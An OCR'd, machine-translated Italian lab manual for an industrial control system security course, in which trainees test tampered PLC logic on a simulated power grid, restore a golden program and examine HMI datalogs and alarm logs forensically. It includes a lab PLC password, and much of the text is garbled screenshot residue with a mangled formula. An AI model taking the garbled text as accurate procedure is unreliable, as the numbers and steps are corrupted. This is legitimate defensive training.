'Modalità OpenPLC Modalità oad Present Control Control Setpoint
 Turbina a vapore
 Stato dell'interblocco

@ intertie Oo Breaker Permissivi
 Turbina a combustione Lecennle AVR On Power Power Power | Modalità esperto interrotta C) Modalità manuale attiva sulla generazione del consumo disponibile
/oltage pri Industrial 5a | MW Locale 1 MW Locale 0 mw lode seeeeiareen are ——— Setpoint: Residenziale 99 | MW intertie |__ 158 Mw intertie [500 wwf
= Mw Totale uw Totale 159 mw = Totale | 500 mw Am ime Messaggio p «7972021105013 PM |Area Allarme Critico 19/2024 10.41.23 Pd Trasmissione rea Allarme Critico 792021 3:55:42 Pla Valvola Carburante Critica Nar 71912021 3:49:27 Pla Generazione Area Allarme Critico 77912021 3:49 :27 PH Generatore locale Nott in For Grezker Closed 79120213 44:38 PM 'Allarme critico area di trasmissione 08/07/2021 14:10:4B PM Allarme critico area di generazione:

© 2021, Robert M. Lee
 Laboratorio 3.4-10

)

)

)

)

"7 7T7TODOD® ew ww
 un ww
 ww w se w
 ip
 TY

> Chiudere l'interruttore del piazzale premendo il pulsante "Chiudi".

> Dovresti vedere aumentare la produzione di MW per soddisfare la domanda del settore residenziale e
 Carichi industriali
 N
 BE Power System HII - Generazione [2 ore di illuminazione]
 Trasmissione
 Generazione |" Distribuzione
 Residenziale Industriale
 Generazione di controlli della valvola del carburante CT

= © Modalità manuale. | 5 J @ Modalità automatica Desideroso)

@ Locale Fare clic su PLC 36 | % Apri O OpenPic Locale o Manuale
'Modalità OpenPLC Levan
 Controllo
 Login
 71812024
 23:26:30
 Stato dell'interblocco
 Turbina a vapore

@ imertie On
 Eratore permissivi dell'interruttore In esecuzione
 ron. Interruttore chiuso
@Trad. Relè di protezione
@ Carica presente
 1
|
|
|
|
 Uscita | Turbina di combustione q |
“154 | MW a |
@ CT In funzione @ AVR Acceso Alimentazione Alimentazione Alimentazione | Modalità esperto — © CT Arrestato © Modalità manuale attiva Generazione consumi disponibile | Sull'uso dei PB “Avvia | _Votazione pd Industrial 59 | MW Locale 158 MW Locale 280 mw |
= Regolazione automatica stati 0 Off = Avvio automatico: sue Setpoint Residenziale 99) «MW intertie 4 MW Intertie 500 Mw On Ml | 280| Mw Totale uw Totale [162 | mw Totale [780] MW
 Orario sveglia Orario conferma Messaggio
 7/9/2021 10:50:13 Allarme Critico Zona Residenziale Pla
 08/07/2021 22:41:23 Allarme critico area di transnussione
 72021 3:55:42 Pi Fug! Allarme critico valvola 1 J
 09/07/2021 15:40.27 Allarme critico Generabon Ares
 792021 15:49:27 Generatore locale Nott Min per interruttore chiuso
 7192021 3:44:38 Allarme critico area di trasmissione Pld:
 7102021 210 48 PU Generazione Ares CeficalAiarm

> Aprire e chiudere l'interruttore del sezionatore per verificare che la modifica del programma PLC supporti correttamente
 funzionamento dell'interruttore.

> Impostare il setpoint della modalità manuale della valvola del carburante CT al 100% e posizionare il controllo della modalità della valvola del carburante
 alla modalità manuale. Verificare la valvola del carburante % Aprire le rampe al 100%

© 2021, Robert M. Lee
 Lab 3.4-11 BB Powers System HMI - Generazione (limite di 2 ore]
 Trasmissione

& Distribuzione _ Residenziale
 Generazione
 Controlli della valvola del carburante CT

@ Modalità manuale
 1
© Modalità automatica mater ae}
 Aprire
 Industriale
 Generazione
 Allarmi

@ Locale Fare clic su PLE
©GpenPLe
 Modalità
 Rif
 epoche
 O
 Controllo
 aria in ingresso
 Tempo Alsim. "Riconosci il messaggio di tempo."
 7/9/2021 10:50,13 Pia Rea Residenziale Allarme Critico
 71812021 22:44:23 "Braccio critico dell'area di trasmissione".
 7192021 3:55.42 Allarme critico valvola carburante pozzo
 77912024 3:49.27 Area generazione PHA Braccio critico
 79912024 3:49:27 Pld Locel Generator Nott lin Far Breaker Slosed 7792021 15.4438 PM 'Trasmissione rea Allarme critico
 79012021 210,48 PL Area Generazione Braccio critico
 Tendenze
 Turbina a vapore
 71912024 e 23:31:24
 Stato dell'interblocco

@intentie On.
 Permessi dell'interruttore
@ Generatore in funzione

@Trad. Interruttore chiuso
@Trens. Relè di protezione
@ Carica presente
 Turbina a Combustione g a 158 | Mw.
@CTRunning @AVROn Power Power Power Modalità esperto OCT arrestato ©)Accoppiamento manuale sulla generazione dei consumi disponibile
 on=useras fl San) _vottage Manuale Industriale 5a | MW Locale 168] MW Locale [280 | mw
 Spento = Avvio automatico = Modalità di regolazione L ne
, Setpoint Residenziale 99 MW intertie ) Mw 500 Mw
_ 200) MW Totale uw Totale [168] ww =Totale [ 7e0 | MW

> Riportare il controllo della modalità della valvola del carburante CT sulla modalità automatica e verificare la percentuale della valvola del carburante
 si sposta su un valore inferiore al 100%
>

“~

*Nota* Quando la valvola del carburante è posizionata in modalità automatica, la percentuale di apertura della valvola del carburante viene calcolata per soddisfare le variazioni di carico. Quando la valvola del carburante è in modalità manuale, la percentuale di apertura della valvola del carburante è impostata sul setpoint della modalità manuale. Si noti inoltre che se la percentuale di apertura manuale della valvola del carburante è troppo bassa per supportare il carico, l'uscita MW del generatore CT sarà limitata dalla percentuale di apertura della valvola del carburante.

> L'OEM ha modificato il funzionamento della valvola del carburante da una relazione lineare come mostrato nel grafico a sinistra a una relazione lineare più aggressiva come mostrato nel grafico a destra. Vogliamo

@
 per testare il nuovo calcolo della valvola del carburante per garantire che il codice della valvola del carburante funzioni correttamente.
 100 100
% Carburante % Valvola carburante Valvola aperta Aperta 0 0
 0MW
 280
 0
 MW
 280

> Per effettuare un controllo rapido, utilizzeremo la seguente formula per convalidare la sostituzione della valvola del carburante.
(MW di potenza + MW massimo del generatore) x 110 = % di potenza della valvola del carburante

© 2021, Robert M. Lee
 Laboratorio 3.4-12
 oe@@oe fe
 diavolo

(B) wwe wo» Wb wb dbo WY wv wb
 Vv Ww WwW FT Ww WwW Ww W
 uo w Ww

*Nota* Nel nostro esempio abbiamo (154 MW di potenza + 280 MW di potenza massima del generatore) x 110 = 60% di potenza della valvola del carburante

> Utilizzando la schermata Generazione, verifica che i calcoli della percentuale di uscita della valvola del carburante siano corretti e che l'OEM abbia effettivamente apportato le modifiche corrette al codice.

> Abbiamo caricato un programma PLC senza arrestare il motore di esecuzione del codice PLC

> Abbiamo configurato la nostra Grid Board per avere l'interruttore di trasmissione chiuso e il relè di protezione della trasmissione ripristinato

> Abbiamo aggiunto carichi residenziali e industriali

> Abbiamo controllato il funzionamento delle risorse di generazione locale attraverso l'HMI e verificato che il controllo della valvola del carburante si adatta automaticamente alle variazioni della domanda di generazione in risposta ai cambiamenti di carico

© 2021, Robert M. Lee Lab 3.4 -13 vo vw YY Sì wu www w

_Laboratorio 3.5 — Verifica del punto sul campo _
 e __ Esaminare tramite strumenti di monitoraggio della rete se il PLC è stato scaricato e Testare la nuova funzionalità logica del PLC e Trovare indizi per determinare cosa c'è di diverso

*Informazioni sullo scenario* Dopo le modifiche logiche apportate con le informazioni degli OEM, dobbiamo esaminare e convalidare la logica e garantire che non si verifichino attività anomale nel nostro ambiente.
 Questa è una continuazione del Lab 3.4 e utilizzerà il kit VM e PLC Windows
 1. Come facciamo a sapere se l'interruttore Switchyard è chiuso? Ci fidiamo dei LED o dello stato dell’HMI?
 2. È possibile controllare l'HMI da remoto?
 3. È possibile che il codice PLC modifichi le schermate HMI?

© 2021, Robert M. Lee Lab 3.5-1 Collaborando con lo staff tecnico sul campo, si azionano i pulsanti fisici e si osservano gli indicatori LED per verificare il corretto funzionamento sul campo.
 1.
 2.
 Prova l'interruttore del commutatore Chiudi PB

> Premere Switchyard Breaker Close PB (questo test dovrebbe verificare che l'operazione di chiusura mantenga il
 interruttore nello stato chiuso e non dovrebbe influenzare in alcun modo la generazione)
 Be Power Sect Hiat- Generazione {2 Hout Lim)
 Trasmissione

& Distribuzione | Residente
 Controlli della valvola del carburante CT

@ Locale Chex PLE
 toa % Apri O Apre
‘ Controlla ‘Canto! Punto di riferimento
 Vela di guerra| [00] «aperto

© Mana ode i 2 © Artoratic Hoe Leow
 Industriale
 Generazione
 79/2024
 ogni 41:50:11 PM
 Stato dell'interblocco

@irtere 09 Breaker Permissivi:

@ Carico presente

“Turbina a vapore

: / Produzione
“Turbina di combustione @ aw |
@crRining Ave oe Power Power Power Expert Made ©) CT interrotto O) Modalità manuale attiva Generazione consumo disponibile
'Sim 8 on=Utenti | Sak | Ba weal indusinat [80] MW toc [+] MW Loca [0 Of = fate Sart: ey —_Selpownt Residentiad [€0] MW nierie [158] MW Inerio ae power | | ww Totale mw Totale [168 | uy Total Tnomicyeire —_Tasnase JAgnas fose-s3pa cra sa imate} e129 Pu “rananareen tee Cris mats} 25640 Ht Ecorse ea sam Yaanes 34827 Fl 'Saneaon na Cra lar Yaya 32037 Pu CSS Steerat ita an: Gear ieree
'zie 34838 Teanamesin sea rarer Semen ea Sa

> Osserva cosa è successo
 Prova l'interruttore del commutatore aperto PB
> Spingi l'interruttore del commutatore per aprire il PB

[Sistema di alimentazione bt - Generazione 2 Hew Lene]
 sione
 memoria! | Residenziale

| Controlli della valvola del carburante CT
| © Manuale Mee 1 TS cx] =
| © Local Chek PLC F

[460] Pene aperto
 Locale ar Marval
 Cpenpic ote, ge
 Setpoint di controllo del controllo
 Aria Intera

| ES
 120 |deg F J —— K Turbina di combustione
@crasning DAM in modalità esperto == ©) CT interrotto © Manual Made On sant BM ctoge = Marat Bi 2. ==) Modalità di regolazione
: Seloort Sop Marah 70] mw]
 Stato dell'interblocco

@ inverso attivato

'Permissivi dell'interruttore

©Generatore Ruoneg

@ Trans Breaker Crsee

@ Trans, Relè Protectan
@ Carica presente

“Turbina a vapore
 183 Jaw Potenza Potenza Consumo energetico Generazione Disponibile industriale [58] MW Locale [160] MW Locale [280] Uw Residenziale [09 | MW contatore [0 | MW batteria [S09 | Mw Totale www Totale [188] ww Totale (709)
 5 R202) 2 40 Pu

> Osserva cosa è successo

© 2021, Robert M. Lee
 Laboratorio 3.5-2

(®) (es) (®) (*) (®) (2)
 aay

>®®®

®) ww wo WO WO WO ODDO DDO OD Dw
 oe ww ww Ww WwW
 ip'

> Sembra che il pulsante di apertura dello Switchyard Breaker chiuda lo Switchyard Breaker
> Sembra che il pulsante di chiusura di Switchyard Breaker apra Switchyard Breaker
> Sembra che i LED di chiusura e apertura dell'interruttore del sezionatore corrispondano allo stato dell'HMI
 Compito: testare le interdipendenze
 La convalida del funzionamento dell'interruttore del quadro ha causato lo spegnimento dell'unità di generazione a causa di un errore nelle operazioni di controllo manuale sul campo che venivano invertite. Il carico residenziale e industriale è rimasto intatto grazie al collegamento interno al sistema elettrico più ampio. La connessione all'interconnessione è molto critica per le operazioni di generazione locale e finché l'interconnessione è attiva e connessa, le risorse di generazione locale non si preoccupano se il carico dalle aree di distribuzione residenziale o industriale va a zero perché la generazione locale le risorse possono fornire energia attraverso l'Intertie. Se l'interconnessione è disattivata, dobbiamo monitorare se le aree residenziali o di distribuzione industriale vanno a zero in modo da poter far scattare l'interruttore del commutatore e disattivare il generatore locale. Dovremmo testare per vedere se lo stato Intertie funziona correttamente.
 1. Testare lo stato della connettività Intertie
> Vai alla schermata Generazione, accendi la turbina a combustione e chiudi l'interruttore del piazzale
> Disattiva l'interruttore Sim 3 - Intertie
> Passare alla schermata Trasmissione e distribuzione
> Fare clic sull'area "Generazione Intertie" per disattivare la connessione Intertie.
 40/7/2021
 Tendenze industriali della generazione residenziale 421742 AM
 Trasmissione e distribuzione
 Brier Lamda Sottostazione Lamda Centrale elettrica TRANSFER BUS
 Lamda Lambda Apri ‘cose | Trasmissione
‘Trasmissione L. Protezione interruttore e Rey a) Guasto | [questo; 4B a ne

. =.& BP wb = - + s ve | @ |
 Consumo di MW a) MW
 Ora allarme Ora conferma: Messaggio 71912021 10:50:13 Pld Residenval 4vea Allarme critico 77912021 10:41:23 Pa Trasmissione Ares Critical Aiarm 7192021 3:59:42 Pla Fuel Valve Critical Alar: 71912021 3:49:27 Pl Generation Area Cittical Allarme 7/9/2021 3.49.27 PH Generatore locale non alla pinna per Greaker Chiuso: 7/9/2021 3:44:38 PA 'Allarme critico area di trasmissione 79912021 14:10:48 PM Allarme critico area di generazione
© 2021, Robert M. Lee Lab 3.5-3 Generazione residenziale industriale
 Generazione 280 MW
 Sottostazione

|
| SL Tunisi |
|
 TRASFERIMENTO AUTOBUS
 Trasmissione e distribuzione =) -- —————
 Lamda
 J Breaker
 Lambda Relè di protezione della trasmissione aperto @) Guasto
. Nuovo
 Richiusura
 7/10/2024 00:20:53
 Consumo MW 191%

=
 Ora allarme Ora conferma Messaggio 792021 105013 Area residenziale animale Criteat arm
 7912021 10:41:23 Pld 'Allarme area critica di trasmissione
 7797202135642 PLL Allarme critico valvola carburante
 71902021 2:49:27 18 Generazione érea Catical
 7912021 15:49:27 Generatore locale Nott iin per interruttore chiuso
 77072021 15:44:38 ‘Allarme caico area di trasmissione
 71992021 2:10:48 Allarme Generazione PA Area Caticai

> L'HMI corrisponde al LED fisico Intertie?
> Attiva l'interruttore Sim 3: Intertie i. Lo stato dell'HMI cambia? ii. Lo stato fisico del LED Intertie cambia?

> Sembra che lo stato dell'interfaccia HMI e il LED fisico dell'interconnessione non corrispondano allo stato

> Sembra che l'impostazione dell'interruttore Sim Switch 3 - Intertie su On non influisca sullo stato Intertie
> Sembra che il codice PLC OEM sia stato alterato in modo potenzialmente dannoso per provocare un'inversione
 funzionamento dei pulsanti fisici di Switchyard

> Sembra che il codice PLC OEM sia stato modificato in modo dannoso per falsificare lo stato del
 Intertie che potrebbe portare a un cattivo funzionamento delle risorse di generazione locale quando l'Intertie lo è
 non disponibile.

© 2021, Robert M. Lee
 Laboratorio 3.5-4

@

= sì vw +

/- guai a
 Compito: test continuo del sistema
 Il nostro sistema è stato programmato per considerazioni estive e invernali. Possiamo utilizzare Sim Switch 2 per simulare queste modalità in cui l'attivazione di Sim Switch 2 ci consentirà di mettere il sistema in modalità invernale. Quando iniziamo a caricare il sistema, possiamo vedere l'effetto della modalità invernale.

> Attiva la modalità invernale
> Attiva l'interruttore Sim 2: modalità invernale

> Attiva l'interruttore Simulazione intertie
> Attiva l'interruttore Sim 3: modalità Intertie

> Carica la zona industriale attivando le raffinerie
> Passa alla schermata Industriale e attiva le raffinerie A e B
 Principale

'Trasmissione
 Generazione e distribuzione TEESE residenziale.
 7130/2021
 19:46:24. USCITA
 Accesso ai trend degli allarmi

\o/
 Consumo di MW
 Pesca MW 299
 Uscita in corrente 99
 Per T T
 Raffineria B accesa
 Spento

> Passare alla schermata di generazione

>
>
>
>
>

© 2021, Robert M. Lee
 Verificare che i controlli del carburante CT siano in modalità Local Click PLC
 Verificare che il CT sia in esecuzione e che la modalità AVR sia attiva
 Notare che il consumo di energia dei MW industriali è maggiore di 200 MW Notare che il consumo di energia dei MW residenziali è maggiore di 80 MW Notare che la produzione di energia dei MW locali è maggiore di 200 MW
 Whamo – Cosa è successo! La schermata HMI è passata alla schermata principale e ora non è più possibile cambiare schermata! Inoltre, hai notato che lo Switchyard Breaker locale mostra uno stato aperto nell'HMI!
 Lab 3.5-5 BB Power System HMI - Principale (limite di 2 ore}
 Generazione

_Generazione
 Residenziale Industriale
 Tendenze
 Intercettazione
 Login

'Trasmissione
 7/10/2024
 1:08:28 EST
 itchyard Configurazione MW Uscita esate Relè di protezione interruttore = n Chiudi Aperto Chiudi | Ripristino errori | N 4 ~ f XN “4 |
|
\7» |
| Generatore \ oye |
|
\ ~oY/\o-— I oo bai a == oc noo - SSS SS SS SSS SSS SSS SS tbe
=| Carico T Min <> Max T 0 T l T
| ‘su mamma AN Reclosure 109 ' ey e) Apri Chiudi me’ | “os i AY 7] tallone 7 \. Misuratore di potenza (%) | na {min <> max 7 \)———
! 1 \em| =o pi | VAN [ee T
© 2021 SANS'Era}! j———-5 Made in the USA, 1 Pe LL 100) industria l t Distribuzione
'Alam ime ~Acmnowiedsetime 'Message 7972021 10:50:13 \area Critcal alarm 7ai2021 10:41.23 Pla Transmission Area Ctical Alarm Tyw2021 355 42 Pe Fuel vahe Citical asm 7172021 3:40:27 PM Ganerabon Area Critical Alarm 71912021 2:49: 27 Pl Locai Generatore non al minimo per interruttore chiuso 7192021 34438 Ph 'Area trasmissione allarme critico 7102021 2:10:48 Pd Generazione area Allarme critico

> Ora siamo bloccati fuori dall'HMI: non possiamo cambiare schermata e utilizzare il nostro sistema
> Non abbiamo scaricato il nuovo codice HMI
> Non siamo sicuri che il codice PLC OEM abbia qualcosa a che fare con il blocco del nostro HMI

© 2021, Robert M. Lee
 Laboratorio 3.5-6

@) ehi,
 ee)

@ va ww ww
 iw
 Attività: ripristinare il codice PLC "
 La risposta tradizionale al codice PLC e/o HMI compromesso è ripristinare il codice PLC precedente o ripristinare una copia “Golden”. Proviamolo e vediamo come va ©.

> Caricare il file della logica operativa nel PLC
 aw
 en
 iw
 UN

> Individuare il file nella cartella ics515 — “I.C.S.515 Site Acceptance Test V1.ckp” i. Questa è la logica valida e nota che era in uso prima della modifica dell'OEM.> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto
 Software di programmazione CLICK (Versione 3.01) - Test di accettazione del sito I.C.S.515 V1.ckp - [Programma principale]
 PAstea re Zz D destini
| © Riferimento incrociato Wyte Project Connect 13 Informazioni sul PLC
 Programma Funzione PLC

| Ry DistindAlarms IL MIO DistindStetes
$y Distindustrial fil DistResAiarms
| iigy DistResidentiat
(Rigg DistResStates Ad Gen Fuel Control

> All'apertura dell'applicazione, trovare nel menu in alto l'icona con la freccia rossa verso il basso che serve per scrivere un progetto in un PLC

> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e dovresti vedere un PLC che è stato rilevato.

'Connettiti a CLICK PLC x
‘Switch/Hub a
«Questo computer + as
: fe — ae ees Connessione Ethemet o Ethernet Direct a S) Posizione del PLC CCK di destinazione

@©n alcune LAN (scansiona automaticamente tutti i PLC CLICK nella LAN.)
 Scheda di rete:
) J) All'esterno di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.) Port Settng Chen BP Address: 192.168.0.8
 Maschera di sottorete; 255.255.258.0 Gateway predefinito: 0.0.0.0
 Aggiorna Bink RUN AERR LED Edt...

© 2021, Robert M. Lee Lab 3.5-7
> Fare clic sul pulsante Connetti

> Inserisci la password “sansics123”.
 sostituire l'intero programma senza eseguire il motore di esecuzione del codice.
 Scrivi il progetto nel PLC Lg |
| Nome del progetto: [I.C.S.S15V10 per schede di produzione —_| |
| Dimensioni del pragramma (totale: 6.000 passaggi) |

| Dimensioni W@iProgram: 1.215 passaggi ({ 15,18 %) | |
| | Area GiiFree: 6.785 passi (84,82%) |
 0
 File di progetto (totale: 262, 144 byte) Dimensione file EiProject 40.590 byte ( 15,48 %) | Area BiFree: 221.554 byte (84,52%) |

| Deeg ama oe 0 262.144 | |
|
 Ultimo aggiornamento: 09 luglio 2021, 22:54:06

| M scrive il file di progetto nel PLC
| Abilitando questa opzione, il file di progetto verrà scaricato{Scrivi) nel PLC. Se vuoi disabilitare il caricamento del progetto (lettura), disabilita questa opzione.
 5
 I.C.S.S15V 10 Modifica OEM per produttore|

“Dimensione del programma (totale: 8.000 passaggi)
 Dimensioni WiProgram: Area GiFree:
 jo
 1.239 passi (15,48 %) 6.761 passi (84,52 %)
 File di progetto (totale: 262, 144 byte)
 Area GiFree delle dimensioni del file BProject:
 41.174 byte (15,70%) 220.970 byte (84,30%)
 Ultimo aggiornamento:
 Modifica ora di esecuzione Abilitando questa opzione, il programma verrà scaricato
 262.144
 09 luglio 2021, 23:12:53
 il PLC senza commutare la modalità PLC su STOP
 modalità,

> - Confermare che si desidera portare il PLC in modalità STOP
 Nome del progetto: [[CS515V10 per schede di produzione |
 1.215 passi (15,18 %) 6.785 passi (84,82 %)
 Fare clic sul software di programmazione
 Il PLC è in modalità RUN.
 Vuoi passare alla modalità STOP?
 09 luglio 2021, 22:54:06
 M1 Scrive il file di progetto nel PLC
 Abilitando questa opzione, il file di progetto verrà trasferito nel PLC. Se vuoi disabilitare il caricamento del progetto (lettura), disabilita questa opzione.

© 2021, Robert M. Lee
 f Tipo CPU PLE: c2-01cPU Nome progetto: {I.C.S.515V10 Modifica OEM per produttore
"Dimensione del programma (totale: 8.000 passaggi)

| Dimensioni del programma: Area GiFree:
 Ultimo aggiornamento:
 144 byte)
 1.239 passi (15,48 %) 6.761 passi (84,52 %)
 8.000|
 41.174 byte (15,70%) |
 220.970 byte (84,30%) |
 Modifica tempo di esecuzione
 262.144
 Abilitando questa opzione, il programma verrà scaricato nel PLC senza portare la modalità PLC in STOP
 modalità.
 UN)
 Aiuto
 09 luglio 2021, 23:12:53 |
 Quando richiesto, deselezionare "Run Time Edit" in modo che il programma PLC interrompa l'esecuzione del programma e
 Laboratorio 3.5-8
 oh oh e

, ® fH ow

)

, B®

® Domne ® ® @

?, Selezionare OK per riportare il PLC in modalità Run

> Verificare che il nuovo codice PLC OEM sia stato scaricato
> Verificare che l'intestazione della finestra indichi "I.C.S.515 Site Acceptance Test V1.ckp"

~Il mio DistResStates
 G4 Gen_Fuel_Control Si Genlarm:

$i generazione
 4 GenStati

(Gf ivinalizza
 nageyoea peepee: ph Samia ie bse

~ ig] RemoteCommWt “Transilarms Aj Trasmissione TransAlarms
| Hy Trasmissione | TransStati:
| fy Programma di interruzione TransStates
| @Selettore indirizzo | Scrivi progetto nel PLC... o Modifica commenti rung ¥ Trasferimento completato.
|

| 1C9515 Test di accettazione in sito V1 - 0 errori, O avvisi

<
 Bist intero Bintegert2 parole) [Bl Floating pom Me (itet (AjAcch RUN

> Verifica se puoi cambiare schermata

> Torna al client HMI FTView e vedi se riesci a cambiare schermata

© 2021, Robert M. Lee
 2-1 CPU
 1A
 Lab 3.5-9 Ty Power System HMl= Principale [2 ore Lint]
 Generazione

'Trasmissione
 7 Intertie Swit ' 5 MW Potenza etal | . Relè di protezione dell'interruttore aperto e chiuso: 'Aperto Chiuso
“f pe a fuga H Aperto, un guasto, «Reset 1 | ‘
‘ Re PN f_® | | | » “ NIA ZN tr Generatore 1 a
= —— Oo o- onfo- foc aor re rte nemo SSSt 4 ---- -- - SSS
= Carico T Min <> Max T 30 LJ T T mal] I | gy red mood iA _ ‘eclosure ks hed ! an Apri Chiudi 7 1 “oN
>7| Carico
(Se 1 \ Misuratore di potenza (6) | Occhio Min Max Wy 50 > a WA N 7 } T
© 2021 SANS | ! Goo 4 fia 5 6 Prodotto negli Stati Uniti. 0! Era yON: 100 Indust | Distribuzione

"Riconosci il tempo."

«Ora delle Allah.»
 71972021 10.50.13 TEL
‘79/2021 10:41:25 PH 77972021 3:55:42 Pd 7/a72021 2:49.27 PA 71972021 349.27 Pu 71a'2021 3:44:38 PA

> Abbiamo scaricato il codice PLC precedentemente eseguito e non possiamo ancora modificare l'HMI
 schermi
 VVVWV
 Messaggio

‘Allarme critico trasmissione 4res
 Valvola carburante Arr. critica
 Allarme critico per l'area di generazione
 Generatore locale Nott Min per interruttore chiuso Area di trasmissione Critical lar
 Il codice HMI non è stato modificato o è stato scaricato Tentare di spegnere e riaccendere il PLC
 Tentare di chiudere l'HMI e riavviarlo Sfruttare i controlli manuali per chiudere gli interruttori di campo e il simulatore passa per cancellare gli allarmi
 poiché non è più possibile navigare tra le pagine degli allarmi tramite l'HMI

> Attraverso questi controlli manuali è possibile avviare manualmente la generazione, tuttavia non è più necessario
 visualizzazione o controllo dell'operatore.
> È ora di chiamare un team di risposta agli incidenti per eseguire alcune analisi

© 2021, Robert M. Lee
 Laboratorio 3.5-10

(*

@) cP
 c®)
 m@) mio) @) ey @) @®)

)
 RP@®@meenenee®

@) ww Ww wa ww
 ww

© Comprendere quali capacità di registrazione e forensi possono esistere sui dispositivi di controllo

*Informazioni sullo scenario* Dopo l'incidente, durante la raccolta dei dati e le attività di analisi forense, ci sono molti dispositivi del sistema di controllo industriale che non dispongono di una forte registrazione relativa alla sicurezza informatica o di capacità forensi. Tuttavia, esistono spesso approcci efficaci per sfruttare l'analisi forense della rete e degli endpoint, nonché l'analisi degli eventi di processo, i dati storici e i dati sugli allarmi per comprendere i vari eventi operativi che si sono verificati. Sfruttare gli strumenti forniti dai fornitori per l'analisi dei file di registro, l'analisi delle tendenze e l'esame dei dati I.C.S. i registri specifici dell'applicazione possono fornire ai difensori del sistema informazioni importanti sul normale comportamento del sistema e sugli eventi anomali.
 Preparazione agli esercizi
 Chiudere tutti gli interruttori del sistema, assicurarsi che il generatore sia in funzione e che l'interconnessione del sistema sia chiusa. Chiudere la schermata HMI dell'operatore.
 1. Qual è il nome del file di registro locale di FactoryTalk?
 Compito: tendenze dei processi e set di dati storici per la medicina legale

*Nota* Il tuo sistema è attualmente bloccato a causa dell'attacco informatico. Non è possibile completare questa attività fino a dopo l'Es 4.2 in cui si ripara il kit. Questo compito rimane qui perché logicamente appartiene qui con il materiale del corso, ma dovrai rivisitare questo compito specifico dopo l'esercizio successivo. Puoi continuare con l'attività successiva.
 1. Esaminare le tendenze dell'HMI.

> Avviare l'HMI ma questa volta selezionare "Sì" per "Elimina file di registro prima dell'esecuzione" nella finestra seguente prima di selezionare "Esegui applicazione".
 Elimina file di registro | ©Y
 Prima di correre
 s C n

> Assicurarsi che tutti gli interruttori siano chiusi, che la generazione sia in corso e che l'interconnessione sia chiusa.

© 2021, Robert M. Lee Lab 4.1-1
> Dall'HMI, aprire il menu "Trend" e scorrere ciascun trend nel menu. Prendere
 notare se alcune tracce mostrano valori storici e attuali mentre altre non sono simili all'immagine seguente.
 Tendenze
 Generazione eee eee Trasmissione e distribuzione

=<)

‘

|

*Nota* A volte esistono anomalie negli ambienti reali che devono essere comprese quando si utilizzano queste applicazioni per scopi forensi. In questo sistema utilizzando il noto sistema I.C.S. software del fornitore, esiste una condizione di competizione tra l'avvio del server di registrazione dati e la risposta dalla richiesta iniziale del server OPC. Il risultato è che alcuni valori vengono registrati continuamente mentre altri non vengono mai registrati. Bug come questi possono diventare più rilevanti con un aumento del mix di fornitori, versioni di applicazioni e risposta del sistema (ad esempio programmazione del PLC e funzionamento della rete). L'immagine sotto mostra questa anomalia. I valori per "CT Running" non vengono registrati anche se sono configurati per la registrazione. Ciò è identificabile a causa della lacuna nei dati prima dell'apertura del display.
 2.

*Nota* I valori di trend vengono interrogati e memorizzati in tempi periodici impostati dallo sviluppatore del display. Ogni volta
 un interruttore del generatore Bl
 oe Interruttore di trasmissione bi
<a} [Relè di protezione MM
 CT in esecuzione

|
| BBAvron
 Comprendere come viene utilizzato lo storico.
 Dall'HMI, apri il menu "Trend" e seleziona "Trasmissione e distribuzione".
 Vengono registrati molti punti dati. A scopo di test, aprire tutti gli interruttori nell'ambiente.
 Ritorna alla schermata "Trasmissione e distribuzione" e nota la modifica dei valori dei punti dati.
 viene aperta una visualizzazione della tendenza, i punti dati e i valori associati vengono richiamati dalla posizione memorizzata. Il modo in cui tali valori vengono archiviati varia a seconda dell'applicazione utilizzata.
 UN
 guarire
 fe

>

>
 3. Comprendere come vengono archiviati i set di dati di tendenza.
> Dalla VM Windows aprire Explorer e accedere alla seguente cartella.
© 2021, Robert M. Lee Lab 4.1-2 ey PF wD Ww WD WP PW eS noi noi ww
 noi noi Ww

"C:\Logs\DataLog"
 Apri il file DataLog.log nel Blocco note.
 Chiaramente il file non è memorizzato in testo normale. Questo file può essere visualizzato utilizzando lo strumento fornito dal fornitore, aprendo l'applicazione "FactoryTalk View File Viewer".
 Passare a "C:\Logs\DataLog" e modificare il tipo di file in "ME Datalog (*.LOG)"
 Nome del file:
 File di registro dati SE (*.DAT;*.0BF) ~

>
 File di registro dati SE (*.DAT;*.OBF)
 File di registrazione dati ME (*.LOG) File di registro allarmi ME(*.ALM)
 File dBASE(*.DBF) File RecipePlus(*.RPP) File RecipePro(*.RCPF)
 Apri il file DataLog.log, scegliendo un fuso orario qualsiasi e rivedi le informazioni.

*Nota* Tutti i record sono presenti e indicano a cosa sono associati. Viene visualizzata la tag configurata dei dati da registrare. Sarebbe utile una mappatura dei nomi dei tag rispetto ai nomi utilizzati nelle visualizzazioni dei trend (ad esempio CT Running), ma può essere facilmente trovata dal tecnico dei controlli. Questo set di dati registra lo stato passato del processo che può essere utilizzato come prova delle condizioni del processo al di fuori delle operazioni previste.
 Attività: elaborare i registri degli allarmi per la scientifica
 1. Identificare i registri degli allarmi dell'HMI.

>
>
 VVVV WV
 Assicurarsi che l'HMI sia in funzione e aprire alcuni interruttori per attivare gli allarmi. Apri Explorer e vai alla seguente cartella.
 C:\Utenti\Pubblica\Documenti\RSView Enterprise\ME\Logs\I.C.S.515V5\M_Alarms
 Dovresti vedere alcuni file di allarme qui, integrati, cronologia, ripristino e registri degli allarmi di stato. Apri l'applicazione "FactoryTalk View File Viewer".
 Passare al percorso del file indicato sopra e premere "Invio".
 Modificare il tipo di file in "File allarme ME (*.ALM)"
 Seleziona la cronologia "history.alm".

© 2021, Robert M. Lee Lab 4.1-3 5D aperto x
- vf © ME > Registri > I.C.S.515V4 > M_Allarmi v © Cerca M_Allarmi Pp Organizza > —_ Nuova cartella ae- © @
 File dello studente Nome Data di modifica Tipo Dimensione B Video ©) embedded.alm File ALM 1KB
@ OneDrive _) file History.alm ALM da 1 KB
“] reimposta ALM Fite 1KB
© Thi > ini ) statusiaim 2021 3:19 EM KB 8 Oggetti 3D
@® Desktop 4) Documenti
e download
} Musica
© Immagini B Video J locaiDiskicn Y < 2
 v| (File registro allarmi ME(*.ALM) ™
 Nome del file: |storia.alm

> Lasciare selezionato il punto elenco "Win32/CE (9.0 o successivo)" e fare clic sul pulsante di selezione del percorso ".... per scegliere
 il file di configurazione dell'allarme.

> Poiché la copia di sviluppo del file di progetto non viene archiviata, sarà necessario utilizzare la versione runtime. Digitare solo %TEMP% nel campo del percorso e selezionare Invio.

